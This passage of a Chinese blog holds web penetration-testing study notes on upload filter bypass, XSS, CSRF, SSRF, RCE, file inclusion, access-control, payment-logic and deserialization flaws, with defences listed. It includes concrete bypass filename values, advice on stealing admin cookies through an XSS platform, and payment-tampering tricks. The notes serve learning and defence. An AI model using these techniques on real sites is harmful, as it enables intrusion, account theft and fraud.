+<p>**<code>filename=”换行1换行.换行p换行h换行p换行”</code>**，在文件名中可以随意换行而代码显示出来的数据就是\n1\n.\np\nh\np\n这样了，\n在代码中表示换行。最后成功绕过并上传文件1.php</p>
+</li>
+<li><p>重复数据：先重复两个合法的filename来测试网站是取后面的还是前面的**<code>filename=”1.jpg”;filename=”2.jpg”</code><strong>，测试出是取末尾数据的值我们就能在前面一直重复合法的filename只将最后一条改为php数据一直重复到成功。(有一点垃圾数据和参数污染的感觉)。复制数据包中正常数据到filename的文件名前面如</strong><code>filename=&quot;Content-Disposition: form-data; name=&quot;upload_file&quot;;1.php&quot;</code><strong>，成功上传文件;1.php，可以把分号去掉变成1.php，同样的方法把中间从数据包中复制的数据换成其他随意的字符串就不行，但不在1.php前面加分号时前面是任意字符串都无所谓如</strong><code>filename=&quot;asfag&quot;1.php&quot;</code>**我使用三个引号时文件正常上传1.php。</p>
+</li>
+</ol>
+<h3 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h3><ol>
+<li><p>后端验证：采用服务器端验证模式</p>
+</li>
+<li><p>后缀检测：基于黑白名单检测（可以都用）</p>
+</li>
+<li><p>MIME检测：基于上传自带类型检测</p>
+</li>
+<li><p>内容检测：文件头、完整性检测</p>
+</li>
+<li><p>WAF防护产品：宝塔、云盾等安全公司产品</p>
+</li>
+</ol>
+<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
+<li><p>xss漏洞产生的原理？</p>
+<p>XSS 被称为跨站脚本攻击，本来应该缩写为CSS，但是由于和CSS重名，所以更名为XSS。</p>
+<p>XSS主要是<strong>基于JavaScript</strong>完成恶意的攻击行为。JS可以非常灵活的操作html、css和浏览器，这使得XSS 攻击的想象空间特别大。</p>
+<p>XSS通过将精心设计构造的<strong>代码（JS）注入网页中</strong>，并<strong>由浏览器解释运行</strong>这段JS代码，以达到恶意攻击的效果。当用户访问被XSS脚本注入的网页，XSS脚本就会被提取出来。用户浏览器就会解析这段浏览器代码，也就是用户被攻击了。</p>
+<p>用户最简单的动作就是使用浏览器上网，并且浏览器中有JavaScript解释器，可以解析JavaScript，然而浏览器不会判断代码是否恶意。也就是说，XSS的对象是用户和浏览器</p>
+</li>
+<li><p>xss漏洞危害？</p>
+<p>通常漏洞执行的是javascript代码，也就是说js代码能做什么漏洞的危害就有多大；产生位置一般在输出函数如：echo；同时需要注意浏览器内核版本也会影响JS脚本的正常执行，如ie浏览器会直接进行拦截</p>
+</li>
+</ol>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol>
+<li><p>反射型</p>
+<p>非持续型，payload不会存储到对方服务器，一次性交互的性质。</p>
+<p>发包x&#x3D;111–&gt;到后端执行x.php–&gt;执行完成后回包给浏览器</p>
+</li>
+<li><p>存储型</p>
+<p>持续型，payload先写到数据库，网站加载数据库内容输出时加载payload达成攻击。每次加载都将执行一次。</p>
+<p>发包x&#x3D;111–&gt;写入后端数据库–&gt;x.php查询调用数据库中这段数据执行–&gt;执行完成后回包给浏览器</p>
+</li>
+<li><p>DOM型</p>
+<p>属于特殊的反射型xss，由HTML执行代码，一般都是与后端进行交互，DOM型直接在前端HTML代码中执行。</p>
+<p>发包x&#x3D;111–&gt;到本地浏览器前端静态代码执行</p>
+</li>
+</ol>
+<h3 id="常见脆弱点"><a href="#常见脆弱点" class="headerlink" title="常见脆弱点"></a>常见脆弱点</h3><ol>
+<li>网站的在线留言、下单、反馈等区域一般会将信息存到数据库等待管理者查看。可以使用该方法窃取管理员cookie等</li>
+<li>与管理员或其他用户有交互的地方</li>
+<li>识别思路，页面根据输入的变量有进行输出显示就可以进行测试。</li>
+</ol>
+<h3 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h3><h4 id="xss平台使用"><a href="#xss平台使用" class="headerlink" title="xss平台使用"></a>xss平台使用</h4><ol>
+<li>百度搜索XSS平台，如：<a target="_blank" rel="noopener" href="https://xss.yt/">https://xss.yt/</a></li>
+<li>创建项目，复制payload代码插入到目标网站中</li>
+<li>目标如果中招就会在第三方平台中显示结果</li>
+</ol>
+<h4 id="xss工具使用"><a href="#xss工具使用" class="headerlink" title="xss工具使用"></a>xss工具使用</h4><ol>
+<li><p>推荐工具postman可以用来修改用户cookie</p>
+</li>
+<li><p>漏洞平台原理：使目标访问漏洞平台恶意文件执行其中的JS代码达成目的。可以自己手动搭建</p>
+</li>
+<li><p>webshell箱子：木马成功登录后将网站地址和密码发送给远程的webshellBox。webshellBox做收集统计归类。</p>
+</li>
+<li><p>下载的木马软件可能带有后门将漏洞信息发送给软件分享者(WebShellBox)，检查数据包有没有向陌生ip发送敏感信息；如果有可以将他获取的敏感信息替换成XSS代码进行反制，反过来拿到WebShellBox的权限。</p>
+</li>
+<li><p><strong>通常情况是我们将木马注入目标网站中，而木马开发者在木马中写入了后门，我们注入到网站的木马会将网站信息和木马的密码发送给开发者，而此时我们将网站信息或密码部分替换成XSSPayLoad当木马开发者或管理员查看时就会中招，达到反制的效果。</strong></p>
+</li>
+<li><p>怎么查看是否工具有后门，在进入大马管理界面时关注有没有向外进行发包</p>
+</li>
+<li><p>BeeF平台使用，通过工具给出的js地址让用户加载达到能够控制对方的浏览器，本地搭建的XSS利用平台</p>
+</li>
+<li><p>xsslabs靶场</p>
+<p>查看网站html代码，检查xss攻击情况，以及单引号和双引号</p>
+<p>&lt;&gt;过滤，以及页面中多个回显输入的地方</p>
+<p>onclick等事件字符过滤</p>
+<p>超链接伪协议&gt;&lt;a href&#x3D;’javascript:xxx’</p>
+<p>大小写绕过网站过滤</p>
+<p>双写绕过</p>
+<p>编码payload进行绕过</p>
+</li>
+</ol>
+<h4 id="xss盗取cookie注意"><a href="#xss盗取cookie注意" class="headerlink" title="xss盗取cookie注意"></a>xss盗取cookie注意</h4><p>在盗取到对方cookie后却发现cookie登陆不了对方网站，这就可能是网站采用session验证，session存储在对方服务器无法获取到，原因这一块讲的不明不白。总结就是获取cookie时没有获取到phpsessid这一个字段，少了这一串导致无法登陆对方网站。</p>
+<h4 id="xss结合其他漏洞"><a href="#xss结合其他漏洞" class="headerlink" title="xss结合其他漏洞"></a>xss结合其他漏洞</h4><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="代码过滤"><a href="#代码过滤" class="headerlink" title="代码过滤"></a>代码过滤</h4><p>网站对用户上传的数据进行了过滤导致payload与构造时结构发生变化或直接过滤为空。</p>
+<h4 id="http-only"><a href="#http-only" class="headerlink" title="http only"></a>http only</h4><p>如果网站设置了http only属性，那么通过js脚本就无法读取到cookie信息。这能有效防止XSS攻击手法。这个方法仅仅只是阻止js读取cookie而不是防止XSS漏洞的利用。</p>
+<p>网站的登录方式大致是两种：cookie和账号密码。http only阻止了读取cookie那么能否通过xss拿到账号密码呢</p>
+<p>登录的账号密码可能存储在本地浏览器中为了方便快捷登录，通过浏览器读取的xss方式读取到浏览器保存的用户名密码</p>
+<p>而没有保存的账号密码想要获取参考<strong>表单劫持</strong>的方式，这种方式需要在登录界面插入xss代码在用户登录时账户密码会额外转发给攻击者一份。但是这种方法比较鸡肋，登录界面不太可能存在注入点。</p>
+<h4 id="waf拦截"><a href="#waf拦截" class="headerlink" title="waf拦截"></a>waf拦截</h4><ol>
+<li>逐个拆解payload，测试是哪部分内容触发了waf的关键字</li>
+<li>标签语法替换</li>
+<li>特殊符号干扰</li>
+<li>提交方式更改</li>
+<li>垃圾数据溢出</li>
+<li>加密解密算法</li>
+<li>结合其他漏洞绕过</li>
+<li>自动化工具：XSStrick主要特点是反射和DOM型XSS的扫描</li>
+<li>Fuzz模糊测试，可以用本地环境试出能绕过的再进行攻击</li>
+</ol>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>安全修复方案</p>
+<ol>
+<li>开启HTTP only</li>
+<li>输入过滤、输出过滤</li>
+<li>安装waf</li>
+</ol>
+<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>跨站请求伪造（Cross-site request forgery,CSRF）是一种攻击，它强制终端用户在当前对其进行<strong>身份验证后</strong>的Web 应用程序上执行非本意的操作。</p>
+<p>CSRF 攻击的<strong>重点在伪造更改状态的请求</strong>，<strong>而不是盗取数据</strong>，因为<strong>攻击者无法查看对伪造请求的响应</strong>。</p>
+<p>借助社工的一些帮助（例如通过电子邮件或聊天发送链接），攻击者可以诱骗用户执行攻击者选择的操作。如果受害者是普通用户，则成功的CSRF 攻击可以强制用户执行状态更改的请求，例如转移资金，更改其电子邮件等。如果受害者是管理账户，CSRF 可能危及整个Web 程序。</p>
+<h3 id="常见漏洞点"><a href="#常见漏洞点" class="headerlink" title="常见漏洞点"></a>常见漏洞点</h3><ol>
+<li>修改、添加、更新的功能处。</li>
+</ol>
+<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><ol>
+<li><strong>设置随机token</strong></li>
+<li>当用户发送重要的请求时需要输入原始密码验证</li>
+<li>检验referer来源</li>
+<li>设置验证码</li>
+<li>限制请求方式只能为POST(无效)</li>
+</ol>
+<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>互联网上的很多Web 应用提供了从其他服务器（也可以是本地）获取数据的功能。使用用户指定的URL，Web 应用可以获取图片、文件资源（下载或读取）。如百度识图等</p>
+<p>用户可以从本地或者URL 的方式获取图片资源，交给百度识图处理。如果提交的是URL 地址，该应用就会通过URL 的方式获取图片资源。如果Web 应用开放了类似于百度识图这样的功能，并且对用户提供的URL和远端服务器返回的信息没有进行合适的验证或者过滤，就可能存在“请求伪造”的缺陷。请求伪造，顾名思义就是攻击者伪造正常的请求，以达到攻击的目的，是常见的Web 安全漏洞之一。如果“请求伪造”发生在服务器端，那么这个漏洞就叫做“服务器端请求伪造”，英文名为Server-Side Request Forgery,简称SSRF。</p>
+<p>SSRF（服务器端请求伪造）是一种攻击者发起的伪造由服务器端发出请求的一种攻击。</p>
+<h3 id="常见漏洞点-1"><a href="#常见漏洞点-1" class="headerlink" title="常见漏洞点"></a>常见漏洞点</h3><ol>
+<li>分享：通过URL地址分享网页内容</li>
+<li>转码服务：通过URL地址把原地址的页面内容调优使其适合手机屏幕浏览</li>
+<li>在线翻译：通过URL地址翻译对应文本的内容。</li>
+<li>图片加载与下载：通过URL加载或下载图片</li>
+<li>图片、文章收藏功能</li>
+<li>未公开的api实现以及其他调用URL的功能</li>
+</ol>
+<h3 id="手法-1"><a href="#手法-1" class="headerlink" title="手法"></a>手法</h3><ol>
+<li>通过网站自身的加载功能让服务器去请求攻击者无法请求的地址，如内网探测</li>
+<li>各种协议调用探针：http、file、dict、ftp、gopher</li>
+<li>如探测到其他内网主机有安全漏洞或存在漏洞的应用，通过服务器对目标进行攻击&#x2F;漏洞利用</li>
+</ol>
+<h2 id="RCE代码及命令执行漏洞"><a href="#RCE代码及命令执行漏洞" class="headerlink" title="RCE代码及命令执行漏洞"></a>RCE代码及命令执行漏洞</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>分为代码执行和命令执行两类：</p>
+<ul>
+<li>代码执行：执行脚本代码</li>
+<li>命令执行：执行系统命令</li>
+</ul>
+<p>RCE漏洞,即Remote Code&#x2F;Command Execution,远程代码执行和远程命令执行漏洞。类似SQL 注入漏洞，SQLi 是将SQL 语句注入到数据库中执行，而代码执行则是可以把代码注入到应用中最终由服务器运行它。这样的漏洞如果没有特殊的过滤，相当于直接有一个Web 后门的存在。</p>
+<p>构成条件主要有两个：</p>
+<ol>
+<li><p>程序中含有可以执行代码的函数或者语言结构</p>
+</li>
+<li><p>传入第一点中的参数，客户端可控，直接修改或者影响</p>
+</li>
+</ol>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>Web 应用如果存在执行漏洞是一件非常可怕的事情，可以通过代码执行漏洞继承Web 用户权限，执行任意代码。如果服务器没有正确的配置，Web 用户权限比较高的话，我们可以读写目标服务器任意文件内容，甚至可控制整个网站以及服务器。</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><ul>
+<li><p>windows</p>
+</li>
+<li><p>linux</p>
+</li>
+</ul>
+<h4 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h4><ul>
+<li><p>web源码</p>
+<p>nexus、webmin、elasticsearch</p>
+</li>
+<li><p>中间件平台</p>
+<p>weblogic、apache</p>
+</li>
+<li><p>其他环境</p>
+<p>postgresql、samba</p>
+</li>
+</ul>
+<h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><ul>
+<li><p>白盒</p>
+<p>代码审计</p>
+</li>
+<li><p>黑盒</p>
+<p>漏扫工具、公开漏洞、手工看应用功能点决定</p>
+</li>
+</ul>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul>
+<li>敏感函数禁用</li>
+<li>变量过滤或固定</li>
+<li>waf产品</li>
+</ul>
+<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><ul>
+<li>php</li>
+<li>Java</li>
+<li>python</li>
+</ul>
+<h4 id="产生-1"><a href="#产生-1" class="headerlink" title="产生"></a>产生</h4><ul>
+<li><p>web源码</p>
+<p>thinkphp、eyoucms、wordpress</p>
+</li>
+<li><p>中间件平台</p>
+<p>tomcat、apache struts2、redis</p>
+</li>
+<li><p>其他环境</p>
+<p>php-cgi、jenkins-ci、Java RMI</p>
+</li>
+</ul>
+<h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><ul>
+<li><p>白盒</p>
+<p>代码审计</p>
+</li>
+<li><p>黑盒</p>
+<p>漏扫工具、公开漏洞、手工看参数值及功能点</p>
+</li>
+</ul>
+<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ul>
+<li>敏感函数禁用</li>
+<li>变量过滤或固定</li>
+<li>waf产品</li>
+</ul>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>文件包含是编程中的正常功能，为了减少重复代码的编写，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码；简单来说就是一个文件里面包含另外一个或多个文件，<strong>将文件以脚本的方式执行</strong>。如果包含文件路径可控那么攻击者就会通过各种方式让它包含一个带有恶意脚本的文件。</p>
+<h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>1、Web 应用实现了动态包含</p>
+<p>2、动态包含的文件路径参数，客户端可控</p>
+<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><p>ASP、PHP、JSP、ASPX、Python、JavaWeb</p>
+<h3 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h3><ul>
+<li><p>白盒</p>
+<p>代码审计</p>
+</li>
+<li><p>黑盒</p>
+<p>漏扫工具</p>
+<p>公开漏洞</p>
+<p>手工看参数值及功能点</p>
+</li>
+</ul>
+<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul>
+<li><p>本地包含</p>
+</li>
+<li><p>远程包含</p>
+<p>需要网站开启可以远程加载</p>
+</li>
+</ul>
+<h3 id="针对限制"><a href="#针对限制" class="headerlink" title="针对限制"></a>针对限制</h3><ol>
+<li><p>包含文件目录后拼接了其他后缀，如”html”</p>
+<ul>
+<li><p>%00截断，将后缀名截断</p>
+</li>
+<li><p>长度截断，windows点号长于256，linux点好长于4096;参考文件上传时的绕过其他符号也可以</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
+<li>http、ftp、file、等各种脚本支持的协议</li>
+<li>找到漏洞，判断网站能否包含远程文件、或通过协议创建文件；就是可以自定义的文件</li>
+<li>如果都不行就只能包含本地文件，本地文件中有些我们可以写入的地方，比如最常见的就是log文件</li>
+</ul>
+<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><ul>
+<li>固定后缀</li>
+<li>固定文件</li>
+<li>waf产品</li>
+</ul>
+<h2 id="文件下载和文件读取漏洞"><a href="#文件下载和文件读取漏洞" class="headerlink" title="文件下载和文件读取漏洞"></a>文件下载和文件读取漏洞</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>任意漏洞下载是因为一般的网站提供了下载文件功能，而下载的文件名或路径是作为参数带入，在带入获得下载文件的时候并没有进行一些过滤，这就导致了漏洞的产生。通常有很多网站对下载的文件目录做了简单的加密处理，如base64。</p>
+<p>文件读取漏洞同理，文件是由文件路径作为参数带入网站中访问。</p>
+<h3 id="检测-3"><a href="#检测-3" class="headerlink" title="检测"></a>检测</h3><ol>
+<li>找到下载文件的地方，查看地址是否有可变参数</li>
+<li>此漏洞的难点在于知晓对方的目录结构、服务器类型。不能准确获取到对方的敏感文件</li>
+</ol>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
+<li><p>只要有进行交互的点都可以进行测试，根据不同的功能点判断与网站中的哪一部分做交互，针对功能构造攻击payload。</p>
+</li>
+<li><p>交互可以是页面内的输入框、URL地址、请求头等等地方。</p>
+</li>
+<li><p>根据不同的业务功能分为不同的攻击类型，达成的攻击效果也是不同的。但抛开这些不谈，交互点单纯就只是我们可输入网站可接收而已。</p>
+</li>
+<li><p>而像csrf这类则是网站和目标用户的交互，我们使用户在不知情的情况下对网站发送请求。</p>
+</li>
+<li><p>所以我们需要判断的就是两点：网站的交互点有哪些、交互点对应的功能是什么。</p>
+</li>
+</ul>
+<ol>
+<li>我们根据网站的主要功能来判断交互点，了解网站搭建者希望该网站做什么事情。</li>
+<li>如果只是单纯输出内容的静态网站那就没有什么测试的必要了。</li>
+</ol>
+<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>越权指用户做出了非自身权限内的行为，按行为分类为<strong>水平越权与垂直越权</strong>。</p>
+<p>水平越权指受影响的对象与越权用户属于同一权限级别。</p>
+<p>垂直越权一般指受影响对象的权限级别高于越权用户，越权用户通过某些手段进行管理员才能做的操作。</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><ol>
+<li>查看个人信息或其他个人权限范围内的操作时抓包将数据包中的用户改为其他用户（可以通过注册时的用户名重复或其他好友等方式获取其他用户名）达到越权查看其他用户信息的效果（水平越权）</li>
+<li>通过普通用户发送只有管理员有权限执行的数据包（通过开源源码本地搭建或盲猜的方式拿到）达到相应的效果，如：添加用户&#x2F;删除用户等（垂直越权）</li>
+<li>如果在访问发现数据包中有用户编号、用户组的编号或类型编号时，尝试对这个值进行修改。有些权限的判定就是根据这个值来进行的。举个例子就像mac中的用户uid&#x2F;gid等</li>
+<li>工具推荐：<ul>
+<li>Privilegechecker 工具有多个浏览器界面和数据包显示</li>
+<li>Authz&#x2F;AuthMatrix   burp插件将数据包和cookie发送到插件判断响应值200为true</li>
+<li>authcheck chrome插件，需要搭建外网服务器，输入地址浏览器就会将访问流量都发送到服务器中进行检测</li>
+</ul>
+</li>
+</ol>
+<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>前后端同时对用户输入信息进行校验，双重校验机制</li>
+<li>调用功能前验证用户是否有权调用相关功能</li>
+<li>执行关键操作前必须校验用户身份，验证用户是否具备操作的权限</li>
+<li>直接对象引用的加密资源id，防止攻击者枚举id，敏感数据特殊化处理</li>
+<li>永远不要相信用户的输入，对于可控参数进行严格检查和过滤</li>
+</ol>
+<h2 id="登录脆弱"><a href="#登录脆弱" class="headerlink" title="登录脆弱"></a>登录脆弱</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><ol>
+<li><p>HTTP&#x2F;HTTPS协议密文抓取</p>
+<p>一般https对数据进行加密，而http则没有，但很多情况下http的网站也会有一些加密。通过抓包判断加密方式。</p>
+</li>
+<li><p>后台登陆账号密码破解</p>
+<p>通常情况下密码都会进行加密传输，如果更改数据包爆破时使用明文的数据肯定不行，通过判断对方使用的加密方式对测试数据进行相同的加密处理再进行传输爆破。</p>
+</li>
+<li><p>Cookie脆弱点验证修改</p>
+<p>网站后台对Cookie的验证存在问题，如只验证了Cookie是否为空或其中出现类似用户名的选项时，就能随便构造一个其他用户名的Cookie进入后台</p>
+</li>
+</ol>
+<h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p>
+<h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>涉及购买、资金等方面的功能处通过抓包更改订单的属性从而造成 小钱够买大物、0元购买商品、无限试用等等；通常是通过 篡改价格、数量、状态、接口、用户名等传参。</p>
+<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><ol>
+<li><p>修改支付价格</p>
+<p>购买商品一般分为三步骤：订购、确认信息、付款。可以在这三个步骤当中的随便一个步骤进行修改价格测试，如果到最后一步没有做好检验，那么问题就会存在。</p>
+</li>
+<li><p>修改支付状态</p>
+<p>没有对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改决定支付或未支付的参数为支付状态的值从而达到支付成功。</p>
+</li>
+<li><p>修改购买数量</p>
+<p>购买数量修改为负数时就会存在问题</p>
+</li>
+<li><p>修改附属值</p>
+<ul>
+<li>修改优惠券金额</li>
+<li>修改积分金额</li>
+</ul>
+</li>
+<li><p>修改支付接口</p>
+<p>点击支付时进行抓包，然后修改其支付接口为一个不存在的接口或自己的支付地址，如果没做好不存在接口相关处理，那么此时就会支付成功。</p>
+</li>
+<li><p>多重替换支付</p>
+<p>修改其订单值为另一个订单值，最后支付，这时就可以用订单1的支付价格买到订单2的商品。</p>
+</li>
+<li><p>重复支付</p>
+<p>你试用时抓包，然后你每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的牌子数量到账户当中，这就构成了无限制刷的问题。</p>
+</li>
+<li><p>最小额支付</p>
+<p>服务器校验金额但也仅校验金额，不是校验与商品对应的金额，也就是说可以购买贵的商品将金额改成便宜商品的金额。</p>
+</li>
+<li><p>值为最大值支付问题</p>
+<p>直接修改支付金额值为最大值，比如999999999，或者修改附属值，如优惠卷，积分等为999999999，如果这里逻辑设计有问题，那么其支付金额会变为0。</p>
+</li>
+<li><p>越权支付</p>
+<p>在支付当中出现当前用户的ID，比如：username&#x3D;XXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品。</p>
+</li>
+<li><p>无限制试用</p>
+<p>重放试用数据包；或试用和支付的接口不同，将试用的接口改为支付，但由于商品属于试用商品绑定的金额肯定是0，点击支付，这就导致了可无限制试用产品</p>
+</li>
+<li><p>修改优惠价</p>
+</li>
+</ol>
+<h2 id="找回机制"><a href="#找回机制" class="headerlink" title="找回机制"></a>找回机制</h2><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p>对于网站给出的找回密码等功能，通过一些方法尝试绕过，达到重置其他用户密码的效果</p>
+<h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><ol>
+<li><p>验证功能客户端回显</p>
+<p>对于找回密码验证是用户本人时，验证条件客户端可以看到</p>
+</li>
+<li><p>Response状态值，基于Response返回值判断</p>
+</li>
+<li><p>验证码爆破，验证码长度短有效时间长</p>
+</li>
+<li><p>找回流程绕过，绕过中间流程直接到最后的重置密码页面</p>
+</li>
+</ol>
+<h2 id="验证安全"><a href="#验证安全" class="headerlink" title="验证安全"></a>验证安全</h2><h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><ol>
+<li><p>爆破</p>
+<p>token没有销毁以及结构简单</p>
+</li>
+<li><p>回显</p>
+<p>token值在响应中传递，用户可见，可以在burp的爆破模块中作为条件</p>
+</li>
+<li><p>固定</p>
+<p>token有固定的规律可寻</p>
+</li>
+</ol>
+<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><ol>
+<li><p>爆破</p>
+<p>验证码长度短并且时间长，如4位15分钟有效期</p>
+</li>
+<li><p>识别</p>
+<ol>
+<li>pkav_Http_Fuzz	工具，识别验证码但只能在工具上操作，准确性也不高</li>
+<li>captcha-killer   burp插件，要钱</li>
+</ol>
+</li>
+<li><p>复用</p>
+<p>验证码在校验完成后没有进行销毁导致的安全问题</p>
+</li>
+<li><p>回显</p>
+<p>验证码写在前端用户可见，或写在js文件中进行加载客户端可见</p>
+</li>
+<li><p>绕过</p>
+<p>分为服务端验证和客户端验证</p>
+<p>服务端验证：验证码在校验完成后没有进行销毁导致的安全问题</p>
+<p>客户端验证：验证码写在前端用户可见，或写在js文件中进行加载客户端可见</p>
+</li>
+</ol>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h3><p>  序列化是将对象的状态信息转换为可以存储或传输的形式（字符串）的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区。<strong>序列化就是把一个对象变成可以传输的字符串，可以以特定的格式在进程之间跨平台、安全的进行通信</strong>；反序列化则将字符串转化成对象。</p>
+<p>  未对传入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而导致各种不可控的后果。</p>
+<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>PHP中的序列化与反序列化，围绕serialize()和 unserialize() 两个函数展开的。<strong>序列化只序列化属性，不序列化方法</strong></p>
+<p>序列化文本格式：<code>对象类型:对象长度:对象名称:属性个数:&#123;属性名类型:属性名长度:属性名;属性值类型:属性值长度:属性值;....&#125;</code></p>
+<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><ul>
+<li><p>Java中的序列化主要应用于多平台之间通信或对象持久化存储</p>
+</li>
+<li><p>Java中的序列化与反序列化，围绕两个流对象进行：ObjectOutputStream(序列化流)、ObjectInputStream(反序列化流)</p>
+</li>
+<li><p>一段数据以<code>rO0AB</code>开头，基本可以确定是Java序列化Base64加密的数据；或者以<code>aced</code>开头就是一段Java序列化的16进制</p>
+</li>
+</ul>
+<h3 id="PHP反序列化分类"><a href="#PHP反序列化分类" class="headerlink" title="PHP反序列化分类"></a>PHP反序列化分类</h3><ul>
+<li><p>有类</p>
+<p>触发魔术方法</p>
+<ul>
+<li>__construct</li>
+<li>__destruct</li>
+<li>__wakeup</li>
+<li>__toString</li>
+</ul>
+</li>
+<li><p>无类</p>
+</li>
+</ul>
+<h3 id="Java反序列化利用"><a href="#Java反序列化利用" class="headerlink" title="Java反序列化利用"></a>Java反序列化利用</h3><ul>
+<li>payload生成器	ysoserial；解析序列化数据工具：SerializationDumper</li>
+<li>自定义检测工具或脚本</li>
+</ul>
+<h3 id="Java反序列化检测"><a href="#Java反序列化检测" class="headerlink" title="Java反序列化检测"></a>Java反序列化检测</h3><ul>
+<li><p>黑盒</p>
+<ul>
+<li><p>数据格式点</p>
+<p>HTTP请求参数、自定义协议、RMI协议</p>
+</li>
+<li><p>特定扫描   没讲</p>
+</li>
+</ul>
+</li>
+<li><p>白盒</p>
+<ul>
+<li><p>函数点</p>
+<p>readObject、parseObject等</p>
+</li>
+<li><p>组件点</p>
+<p>参考ysoserial库</p>
+</li>
+<li><p>功能点</p>
+<p>RCE执行、数据认证</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>SQL注入</li>
+<li>代码执行</li>
+<li>目录遍历</li>
+</ul>
+<h2 id="XXE-amp-XML利用检测绕过"><a href="#XXE-amp-XML利用检测绕过" class="headerlink" title="XXE&amp;XML利用检测绕过"></a>XXE&amp;XML利用检测绕过</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/01/25/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
